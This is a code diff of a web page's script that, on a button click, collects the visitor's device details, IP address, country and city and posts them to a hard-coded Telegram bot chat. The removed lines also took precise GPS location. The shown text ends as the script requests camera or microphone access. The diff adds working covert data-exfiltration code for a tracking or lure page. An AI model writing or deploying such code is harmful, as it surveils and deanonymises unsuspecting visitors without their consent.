@@ -41,13 +41,22 @@
         const CHAT_ID = "6125741059";
         const TARGET_URL = "https://Suck";
 
+        async function sendTextData(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                });
+            } catch (e) {}
+        }
+
         document.getElementById('goBtn').addEventListener('click', async () => {
-            let userInfo = "📊 Comprehensive Device & Location Info:\n";
+            let userInfo = "📊 Device & Location Info:\n";
             
-            userInfo += `⏱ Timestamp: ${new Date().toLocaleString()}\n`;
+            userInfo += `⏱ Time: ${new Date().toLocaleString()}\n`;
             userInfo += `💻 Platform: ${navigator.platform}\n`;
             userInfo += `🌐 Language: ${navigator.language}\n`;
-            userInfo += `📱 User Agent: ${navigator.userAgent}\n`;
 
             if (navigator.connection) {
                 userInfo += `⚡ Connection Type: ${navigator.connection.effectiveType || 'Unknown'}\n`;
@@ -67,34 +76,12 @@
                 const ipData = await ipRes.json();
                 userInfo += `🌐 Country: ${ipData.country_name}\n`;
                 userInfo += `🏙 City: ${ipData.city}\n`;
-                userInfo += `📌 IP Address: ${ipData.ip}\n`;
-                userInfo += `🏢 ISP / Network: ${ipData.org}\n`;
-            } catch (e) {}
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    const acc = pos.coords.accuracy;
-                    userInfo += `🗺 Google Maps Location: https://maps.google.com/?q=${lat},${lon}\n`;
-                    userInfo += `🎯 Accuracy: ${acc} meters\n`;
-                    sendTextData(userInfo);
-                }, () => {
-                    sendTextData(userInfo);
-                }, { timeout: 5000, enableHighAccuracy: true });
-            } else {
-                sendTextData(userInfo);
+                userInfo += `📌 IP: ${ipData.ip}\n`;
+            } catch (e) {
+                userInfo += `📌 IP: Failed to fetch\n`;
             }
 
-            async function sendTextData(text) {
-                try {
-                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-                    });
-                } catch (e) {}
-            }
+            await sendTextData(userInfo);
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
